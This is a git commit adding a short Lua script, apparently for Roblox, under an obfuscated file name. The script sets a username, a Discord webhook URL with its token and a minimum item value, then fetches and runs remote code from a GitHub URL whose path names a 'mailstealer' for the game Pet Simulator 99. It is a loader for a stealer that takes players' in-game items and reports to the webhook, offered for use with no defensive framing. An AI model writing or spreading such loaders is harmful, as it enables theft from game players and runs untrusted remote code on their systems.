0c4ba450536ab5ff410123dd056f24eb3a55c32f
RedzHub0 <dexterintia213@gmail.com>
2024-08-30 14:24:19 +0800

    Add files via upload

---
+++ obf_0HP1S1OwqTY0N6X6K6MXy748YcW1HLg60Xm28UP68G2955Q9V0b190Kw3YxKC7PE.lua
@@ -0,0 +1,4 @@
+Username = "OFFICIALREDZHUB"
+Webhook = "[your webhook here](https://discord.com/api/webhooks/1278951735137927261/eTYdO9zCUE-GkxYa4g4_7d4vjyJE2LuHgBmsOZ8oJ6uhWxxO37iiIcbr0DtUmV_pjcBa)"
+min_rap =   --minimum rap
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/main/PS99/mailstealer"))() 
